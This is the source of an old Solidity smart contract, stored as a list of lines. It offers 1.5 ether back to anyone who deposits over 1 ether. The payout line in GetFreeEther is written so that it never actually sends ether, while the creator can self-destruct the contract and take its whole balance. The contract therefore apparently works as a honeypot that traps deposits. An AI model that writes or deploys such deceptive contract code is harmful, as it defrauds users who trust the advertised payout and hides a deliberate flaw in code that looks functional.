['pragma solidity ^0.4.19;\n', '\n', 'contract QUICK_DEPOSIT_FOR_FUN    \n', '{\n', '    address creator = msg.sender;\n', '    uint256 public LastExtractTime;\n', '    mapping (address=>uint256) public ExtractDepositTime;\n', '    uint256 public freeEther;\n', '    \n', '    function Deposit()\n', '    public\n', '    payable\n', '    {\n', '        if(msg.value> 1 ether && freeEther >= 0.5 ether)\n', '        {\n', '            LastExtractTime = now + 1 days;\n', '            ExtractDepositTime[msg.sender] = LastExtractTime;\n', '            freeEther-=0.5 ether;\n', '        }\n', '    }\n', '    \n', '    function GetFreeEther()\n', '    public\n', '    payable\n', '    {\n', '        if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now)\n', '        {\n', '            msg.sender.call.value(1.5 ether);\n', '            ExtractDepositTime[msg.sender] = 0;\n', '        }\n', '    }\n', '    \n', '    function PutFreeEther()\n', '    public\n', '    payable\n', '    {\n', '        uint256 newVal = freeEther+msg.value;\n', '        if(newVal>freeEther)freeEther=newVal;\n', '    }\n', '    \n', '    function Kill()\n', '    public\n', '    payable\n', '    {\n', '        if(msg.sender==creator && now>LastExtractTime + 2 days)\n', '        {\n', '            selfdestruct(creator);\n', '        }\n', '        else revert();\n', '    }\n', '    \n', '    function() public payable{}\n', '}']